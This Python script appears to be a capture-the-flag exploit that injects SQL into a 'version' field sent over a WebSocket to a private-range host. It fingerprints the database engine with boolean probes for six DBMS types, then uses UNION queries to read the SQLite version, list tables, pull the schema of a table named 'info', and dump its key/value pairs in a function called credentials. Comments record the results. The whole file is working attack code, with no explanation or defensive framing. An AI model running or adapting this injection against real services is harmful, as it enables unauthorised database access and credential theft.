import websocket,json
import sys
from string import *
import time

ws = websocket.WebSocket()

def guess_dbms():
	dbmses = [
		["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
		["connection_id()=connection_id()"                 ,"MYSQL"],
		["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
		["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
		["@@CONNECTIONS>0"                                 ,"MSSQL"],
		["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
		["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
		["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
		["ROWNUM=ROWNUM"                                   ,"ORACLE"],
		["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
		["LNNVL(0=123)"                                    ,"ORACLE"],
		["5::int=5"                                        ,"POSTGRESQL"],
		["5::integer=5"                                    ,"POSTGRESQL"],
		["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
		["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
		["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
		["current_database()=current_database()"           ,"POSTGRESQL"],
		["sqlite_version()=sqlite_version()"               ,"SQLITE"],
		["last_insert_rowid()>1"                           ,"SQLITE"],
		["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
		["val(cvar(1))=1"                                  ,"MSACCESS"],
		["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
		["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
		["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
		["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
	]


	for dbms in dbmses:
		data = {"version": '0.0.2" AND %s --' % dbms[0]}
		data = str(json.dumps(data))
		#print(data)

		ws.connect("ws://10.10.11.206:5789/version")
		ws.send(data)
		result = ws.recv()
		
		if result:
			print("[" + dbms[1] + ", " + dbms[0] + "]: " + result)

def get_version():
	data = {"version": '0.0.2" UNION SELECT sqlite_version(), NULL, NULL, NULL --'}
	data = str(json.dumps(data))

	ws.connect("ws://10.10.11.206:5789/version")
	ws.send(data)
	result = ws.recv()
	
	print(result)

def dump_tables():
	for i in range(0,10):
		data = {"version": '0.0.2" UNION SELECT name, NULL, NULL, NULL FROM sqlite_schema WHERE type=\'table\' ORDER BY name LIMIT %d --' % i}
		data = str(json.dumps(data))

		ws.connect("ws://10.10.11.206:5789/version")
		ws.send(data)
		result = ws.recv()
		
		print(result)


def custom():
	for i in range(0,10):
		data = {"version": '0.0.2" UNION SELECT sql, NULL, NULL, NULL FROM sqlite_master WHERE type!=\'meta\' AND sql NOT NULL AND name =\'info\' ORDER BY 1 LIMIT %d --' % i}
		data = str(json.dumps(data))

		ws.connect("ws://10.10.11.206:5789/version")
		ws.send(data)
		result = ws.recv()
		
		print(result)

def credentials():
	for i in range(0,10):
		data = {"version": '0.0.2" UNION SELECT key, value, NULL, NULL FROM info ORDER BY 1 LIMIT %d --' % i}
		data = str(json.dumps(data))

		ws.connect("ws://10.10.11.206:5789/version")
		ws.send(data)
		result = ws.recv()
		
		print(result)

if __name__ == '__main__':
	#guess_dbms() # SQLITE
	#get_version() # 3.37.2
	#dump_tables() # answers, info, reports, users, sqlite_sequence
	custom()
	credentials()